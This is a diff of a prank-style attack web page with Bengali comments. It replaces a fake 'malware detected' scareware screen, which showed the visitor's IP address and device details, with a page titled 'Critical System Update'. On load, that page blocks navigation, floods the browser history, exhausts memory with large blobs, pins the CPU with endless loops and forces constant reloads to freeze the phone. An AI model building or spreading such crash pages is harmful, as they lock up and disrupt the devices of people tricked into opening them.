@@ -3,98 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🛡️ Security Protocol 101</title>
+    <title>Critical System Update</title>
     <style>
-        body { background: #000; color: #ff0000; text-align: center; padding: 20px; font-family: 'Courier New', monospace; overflow: hidden; user-select: none; }
-        .loader { border: 8px solid #111; border-top: 8px solid #ff0000; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #console { font-size: 11px; text-align: left; padding: 15px; color: #00ff00; height: 180px; overflow-y: hidden; border: 1px dashed #444; background: rgba(0,255,0,0.05); margin-bottom: 20px; }
-        .data-box { border: 1px solid #ff0000; padding: 10px; margin-bottom: 10px; font-size: 13px; background: #1a0000; }
-        .blink { animation: blink 0.6s infinite; color: yellow; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
-        button { background: #ff0000; color: white; border: none; padding: 15px 30px; font-weight: bold; cursor: pointer; border-radius: 5px; }
+        body { background: #000; margin: 0; padding: 0; overflow: hidden; cursor: none; }
     </style>
 </head>
-<body onclick="startAttack()">
-
-    <div class="loader"></div>
-    <h2 class="blink">⚠️ ALERT: MALWARE DETECTED ⚠️</h2>
-    
-    <div class="data-box">
-        <b>TARGET INFO:</b><br>
-        IP: <span id="user-ip">Loading...</span><br>
-        DEVICE: <span id="user-device">Detecting...</span><br>
-        BATTERY: <span id="user-bat">...</span>
-    </div>
-
-    <div id="console">
-        [SYS] Initializing Forensic Scan...<br>
-    </div>
-
-    <button id="mainBtn">CLICK TO SECURE DEVICE</button>
-
-    <audio id="alarm" src="https://www.soundjay.com/buttons/beep-01a.mp3" loop></audio>
-
+<body>
     <script>
-        // ১. ইউজারের ডাটা সংগ্রহ (IP & Device)
-        fetch('https://ipapi.co/json/').then(res => res.json()).then(data => {
-            document.getElementById('user-ip').innerText = data.ip + " (" + data.org + ")";
-            document.getElementById('user-device').innerText = navigator.platform;
-        });
+        // ১. বের হওয়ার সব রাস্তা বন্ধ (No Back, No Exit)
+        window.onbeforeunload = () => { return "CRITICAL_ERROR: SYSTEM_HALTED"; };
 
-        // ব্যাটারি পারসেন্টেজ ডিটেকশন
-        if (navigator.getBattery) {
-            navigator.getBattery().then(bat => {
-                document.getElementById('user-bat').innerText = (bat.level * 100) + "%";
-            });
-        }
-
-        window.onbeforeunload = function() { return "Critical Error!"; };
-
-        function startAttack() {
-            // সাইরেন বাজানো
-            document.getElementById('alarm').play();
-            document.getElementById('mainBtn').style.display = "none";
-            
-            // ফুলস্ক্রিন
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
-
-            let consoleDiv = document.getElementById('console');
-            let logs = [
-                "[#] Bypassing Kernel...",
-                "[#] Accessing Internal Storage...",
-                "[#] Uploading DCIM/Camera to Cloud...",
-                "[#] Encrypting User Files...",
-                "[#] Deleting System32/Root...",
-                "[!] FINALIZING LOCKDOWN..."
-            ];
-
-            let count = 0;
-            let logClock = setInterval(() => {
-                if (count < logs.length) {
-                    consoleDiv.innerHTML += logs[count] + "<br>";
-                    count++;
-                    if (navigator.vibrate) navigator.vibrate(200);
-                } else {
-                    clearInterval(logClock);
-                    executeCrash();
-                }
-            }, 600);
-        }
-
-        function executeCrash() {
-            document.body.innerHTML = "<h1 style='color:white; margin-top:40%;'>SYSTEM HALTED.<br>ERROR 0xFB882</h1>";
-            
-            // ২. মেমোরি এবং ব্যাক বাটন ব্লক
+        window.onload = () => {
+            // ২. হিস্ট্রি বাফার স্প্যাম (Back বাটন পুরোপুরি জ্যাম করা)
             for (let i = 0; i < 1000000; i++) {
-                history.pushState(null, null, "#FATAL-ERROR-" + i);
+                history.pushState(null, null, "#FATAL_ERROR_" + Math.random().toString(36));
+            }
+            // ০.১ সেকেন্ডের মধ্যে অ্যাটাক শুরু
+            setTimeout(executeOmniCrash, 100);
+        };
+
+        function executeOmniCrash() {
+            const blobs = [];
+            const memoryLeak = [];
+
+            // ৩. GPU & RAM Stress (ডিসপ্লে এবং মেমোরি ফ্রিজ করা)
+            function leakResources() {
+                while (true) {
+                    // Huge Blobs তৈরি (র‍্যাম দ্রুত শেষ করার জন্য)
+                    const blob = new Blob([new ArrayBuffer(1024 * 1024 * 100)]); // 100MB chunks
+                    blobs.push(URL.createObjectURL(blob));
+                    
+                    // Memory Burner (র‍্যাম ডাটা জ্যাম করা)
+                    memoryLeak.push(new Array(1000000).fill("FREEZE_" + Math.random()));
+                    
+                    if (blobs.length > 1000) break; 
+                }
             }
 
-            // ৩. CPU এবং RAM ওভারলোড
-            let storage = [];
+            // ৪. Multi-Core CPU Overload (সবগুলো কোর লক করা)
+            function cpuBurner() {
+                // Recursive Task Flood
+                function flood() {
+                    let data = JSON.stringify(window.performance);
+                    console.log(data.repeat(1000));
+                    
+                    // CPU-কে ইনফিনিট লুপে আটকানো
+                    while(true) {
+                        let x = Math.sqrt(Math.random()) * Math.tan(Math.random());
+                        if (Date.now() % 100 === 0) break; 
+                    }
+                    setTimeout(flood, 0);
+                }
+                flood();
+            }
+
+            // ৫. সব অ্যাটাক একসাথে লঞ্চ করা (God Mode Execution)
+            try {
+                leakResources(); // মেমোরি শেষ করবে
+                
+                // ৩০টি আলাদা থ্রেডে CPU অ্যাটাক শুরু (সব কোর বিজি করবে)
+                for (let j = 0; j < 30; j++) {
+                    setTimeout(cpuBurner, j * 10);
+                }
+            } catch (e) {}
+
+            // ৬. হার্ড রিফ্রেশ লুপ (ফাইনাল লক)
+            // এটি ফোনকে বারবার পেজ লোড করতে বাধ্য করবে যাতে ফোন কুলডাউন না হয়
+            setInterval(() => {
+                history.pushState(null, null, "#LOCK_" + Date.now());
+                location.reload(); 
+            }, 50);
+
+            // ৭. কার্নেল লেভেল ফ্রিজ (Final Infinite Block)
             while(true) {
-                storage.push(new Array(1000000).fill("FREEZE"));
-                console.log("CRASHING_SYSTEM_NODE_" + Math.random());
+                // এটি ব্রাউজারের মেইন থ্রেড পুরোপুরি লক করে দেবে
+                let x = Math.random() * Math.random();
+                console.table(window.performance.getEntries());
             }
         }
     </script>
